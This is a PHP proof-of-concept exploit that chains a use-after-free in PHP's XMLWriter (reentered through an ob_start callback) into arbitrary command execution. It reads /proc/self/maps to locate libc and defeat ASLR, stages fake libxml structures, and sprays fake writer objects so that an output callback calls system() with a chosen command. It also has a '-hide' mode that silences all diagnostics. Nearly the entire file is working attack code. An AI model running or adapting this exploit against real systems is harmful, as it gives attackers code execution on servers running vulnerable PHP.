<?php
/*
 * Full-chain RCE PoC (verbose): XMLWriter output reentrancy UAF ->
 * fake xmlTextWriter -> fake xmlOutputBuffer -> writecallback = system(cmd).
 *
 *   outer XMLWriter::writeElement()
 *     -> ob_start() callback fires mid-serialization
 *     -> XMLWriter::openMemory() frees the in-flight xmlTextWriter
 *     -> 79-byte binary Dom text sprays reclaim it (tcache LIFO)
 *     -> outer xmlTextWriterEndElement() resumes on OUR fake writer
 *     -> xmlOutputBufferWriteString(fake out) -> writecallback(context,...)
 *     -> system(cmd)   [x0 = fully controlled]
 *
 * All fake structs are staged in one >2MB PHP string (ZendMM huge block =
 * its own 2MB-aligned mmap, found by diffing /proc/self/maps). No debug
 * helper, no ASan, no allocator tricks.
 *
 * Usage: php -n xmlwriter_rce_full_chain.php [-hide] [command] [stage_offset=24]
 *   -hide   silent mode: no addresses, no struct dumps, no PHP notices;
 *           result signalled only via exit code (0 = command executed)
 */

$args = $argv;
array_shift($args);
$HIDE = false;
foreach ($args as $i => $a) {
    if ($a === '-hide') { $HIDE = true; unset($args[$i]); }
}
$args = array_values($args);
$CMD = $args[0] ?? 'id > /tmp/pwned; uname -a >> /tmp/pwned';
$CMD .= "\0";
$BOFF = (int)($args[1] ?? 24);

if ($HIDE) error_reporting(0); // suppress the reentrancy Deprecation notice too

function say(string $fmt, ...$a): void {
    global $HIDE;
    if ($HIDE) return;
    fprintf(STDERR, $fmt . "\n", ...$a);
}
function hexdump(string $b, string $label = ''): void {
    if ($label !== '') say("    %s (%d bytes):", $label, strlen($b));
    for ($i = 0; $i < strlen($b); $i += 16) {
        $chunk = substr($b, $i, 16);
        $hex = implode(' ', str_split(bin2hex($chunk), 2));
        $asc = preg_replace('/[^\x20-\x7e]/', '.', $chunk);
        say("      +%04x  %-47s  %s", $i, $hex, $asc);
    }
}

say("================================================================");
say(" XMLWriter reentrancy UAF -> system()  |  verbose PoC");
say(" PHP %s | libxml %s | pid %d", PHP_VERSION, LIBXML_DOTTED_VERSION, getmypid());
say(" command: %s", rtrim($CMD, "\0"));
say("================================================================");

/* ---------------------------------------------------------------- */
say("[1/5] ASLR defeat: parsing /proc/self/maps ...");

$maps0 = file('/proc/self/maps', FILE_IGNORE_NEW_LINES);
$libcBase = null; $libcLine = '';
foreach ($maps0 as $line) {
    if (str_contains($line, 'libc.so.6')) {
        $libcLine = trim($line);
        preg_match('/^([0-9a-f]+)-/', $line, $m);
        $libcBase = intval($m[1], 16);
        break;
    }
}
if ($libcBase === null) die("!! no libc mapping\n");
$system = $libcBase + 0x4bf90; // nm -D libc.so.6 | grep -w system
say("      libc mapping: %s", $libcLine);
say("      libc base   = 0x%x", $libcBase);
say("      system()    = 0x%x  (base + 0x4bf90)", $system);

/* ---------------------------------------------------------------- */
say("[2/5] Staging fake structs in a ZendMM huge block ...");
say("      allocating 8MB string -> zend_mm_alloc_huge() gives it a");
say("      private 2MB-aligned mmap with NO chunk header (content at +24)");

$SLEN = 8 * 1024 * 1024 - 24 - 1;
$before = [];
foreach ($maps0 as $l) $before[$l] = true;
$stage = str_repeat("\0", $SLEN);

$B = null; $mapLine = '';
foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $line) {
    if (isset($before[$line])) continue;
    if (preg_match('/^([0-9a-f]+)-([0-9a-f]+) (rw-p)/', $line, $m)
        && !str_contains($line, '/')
        && intval($m[2], 16) - intval($m[1], 16) >= 6 * 1024 * 1024
        && intval($m[1], 16) % (2 * 1024 * 1024) === 0) {
        $mapLine = trim($line);
        $B = intval($m[1], 16) + $BOFF;
        break;
    }
}
if ($B === null) die("!! huge block mapping not found\n");
say("      new mapping : %s", $mapLine);
say("      stage base  = 0x%x  (mapping + 0x%x zend_string hdr)", $B, $BOFF);

/* ---------------------------------------------------------------- */
say("[3/5] Building fake libxml structs (offsets relative to stage base)");

$O_LIST  = 0x100;  // fake xmlList   (24 bytes)
$O_LINK  = 0x140;  // fake xmlLink   (24 bytes)
$O_ENTRY = 0x180;  // fake xmlTextWriterStackEntry (16 bytes)
$O_OUT   = 0x200;  // fake xmlOutputBuffer (56 bytes)
$O_BUF   = 0x240;  // fake xmlBuf    (48 bytes)
$O_NAME  = 0x300;  // element name
$O_CMD   = 0x400;  // command string
$O_SCR   = 0x500;  // xmlBuf content scratch (zeros are fine)

/* in-place pokes only: substr_replace() would realloc the 8MB string
 * and invalidate $B */
function poke(string &$s, int $off, string $bytes): void {
    $n = strlen($bytes);
    for ($i = 0; $i < $n; $i++) $s[$off + $i] = $bytes[$i];
}
function pq(int $v): string { return pack('P', $v); } // LE qword

poke($stage, 0x00, "STAGEv1\0");
/* xmlList: sentinel -> fake link (survives xmlListFront/xmlListEmpty) */
poke($stage, $O_LIST, pq($B + $O_LINK) . pq(0) . pq(0));
/* xmlLink: self-referential (unlink writes stay in-stage), data -> entry */
poke($stage, $O_LINK, pq($B + $O_LINK) . pq($B + $O_LINK) . pq($B + $O_ENTRY));
/* stack entry: state = XML_TEXTWRITER_TEXT (2) -> takes the out-writing path */
poke($stage, $O_ENTRY, pq($B + $O_NAME) . pack('V', 2) . "\0\0\0\0");
/* xmlOutputBuffer: context=cmd ptr, writecallback=system, encoder=NULL,
 * buffer -> fake xmlBuf */
poke($stage, $O_OUT,
    pq($B + $O_CMD) . pq($system) . pq(0) . pq(0) . pq($B + $O_BUF) . pq(0) .
    pack('V', 0) . pack('V', 0));
/* xmlBuf: use=4096 >= MINLEN(4000) forces IMMEDIATE writecallback call;
 * size-use > 2 avoids xmlBufGrow; flags=0 */
poke($stage, $O_BUF,
    pq($B + $O_SCR) . pq($B + $O_SCR) . pq(4096) . pq(8192) . pq(0x4000000) .
    pack('V', 0) . "\0\0\0\0");
poke($stage, $O_NAME, "x\0");
poke($stage, $O_CMD, $CMD);

say("    xmlList            @ B+0x%03x = 0x%x", $O_LIST, $B + $O_LIST);
say("      .sentinel        -> 0x%x (fake xmlLink)", $B + $O_LINK);
say("    xmlLink            @ B+0x%03x = 0x%x", $O_LINK, $B + $O_LINK);
say("      .next/.prev      -> self (unlink writes land in-stage, harmless)");
say("      .data            -> 0x%x (fake stack entry)", $B + $O_ENTRY);
say("    stack entry        @ B+0x%03x = 0x%x", $O_ENTRY, $B + $O_ENTRY);
say("      .state           = 2 (XML_TEXTWRITER_TEXT)");
say("    xmlOutputBuffer    @ B+0x%03x = 0x%x", $O_OUT, $B + $O_OUT);
say("      .context         -> 0x%x (command string)  <== x0 at call", $B + $O_CMD);
say("      .writecallback   =  0x%x (system)          <== PC at call", $system);
say("      .buffer          -> 0x%x (fake xmlBuf)", $B + $O_BUF);
say("    xmlBuf             @ B+0x%03x = 0x%x", $O_BUF, $B + $O_BUF);
say("      .use             = 4096 (>= MINLEN 4000 -> flush fires at once)");
hexdump(substr($stage, $O_OUT, 56), "staged xmlOutputBuffer (read back)");
hexdump(substr($stage, $O_BUF, 48), "staged xmlBuf (read back)");

/* ---------------------------------------------------------------- */
say("[4/5] Building fake xmlTextWriter spray payload (79 bytes + NUL = 80)");
say("      = sizeof(xmlTextWriter): reclaims the freed writer via tcache LIFO");

$fw = str_repeat("\0", 79);
$fw = substr_replace($fw, pq($B + $O_OUT),  0, 8); // +0  out
$fw = substr_replace($fw, pq($B + $O_LIST), 8, 8); // +8  nodes
/* +16 nsstack=0, +24 level/indent/doindent=0, +40 ichar=0, +48 qchar=0,
 * +56 ctxt=0, +64 no_doc_free=0, +72 doc=0 (byte 79 is the allocator's NUL) */

say("      .out   -> 0x%x (fake xmlOutputBuffer)", $B + $O_OUT);
say("      .nodes -> 0x%x (fake xmlList)", $B + $O_LIST);
hexdump($fw, "fake xmlTextWriter payload");

/* ---------------------------------------------------------------- */
say("[5/5] Trigger: XMLWriter on php://output + ob_start() callback ...");
say("      writing 1000 x 100-byte elements through a 256-byte ob chunk;");
say("      the callback will fire mid-serialization inside libxml");

@unlink('/tmp/pwned');
$writer = new XMLWriter();
$writer->openUri('php://output');
$entered = false;
$sprays = [];
ob_start(function (string $buffer) use (&$entered, $writer, &$sprays, $fw): string {
    if (!$entered) {
        $entered = true;
        say("      >> ob callback entered (%d bytes flushed)", strlen($buffer));
        $writer->openMemory();   // frees the in-flight xmlTextWriter
        say("      >> openMemory(): in-flight writer freed (UAF window open)");
        $d = Dom\XMLDocument::createEmpty();
        $root = $d->appendChild($d->createElement('r'));
        for ($i = 0; $i < 64; $i++) $root->append($fw);
        $sprays[] = $d;
        say("      >> sprayed 64 x 79-byte fake writers (tcache reclaims the chunk)");
        say("      >> returning: outer xmlTextWriterEndElement() resumes on");
        say("         the fake writer -> WriteString(fake out) -> system(cmd)");
    }
    return '';
}, 256);
$writer->startDocument();
$writer->startElement('root');
for ($i = 0; $i < 1000; $i++) $writer->writeElement('item', str_repeat('A', 100));
$writer->endElement();
$writer->endDocument();
$writer->flush();
ob_end_clean();

say("----------------------------------------------------------------");
say("survived (no crash); callback entered = %d", (int)$entered);
$ok = file_exists('/tmp/pwned');
if ($ok && !$HIDE) {
    say("=== RCE CONFIRMED: /tmp/pwned ===");
    echo file_get_contents('/tmp/pwned');
} elseif (!$ok) {
    say("!! no /tmp/pwned - chain failed (check reclaim with sigcatch.so)");
}
exit($ok ? 0 : 1);
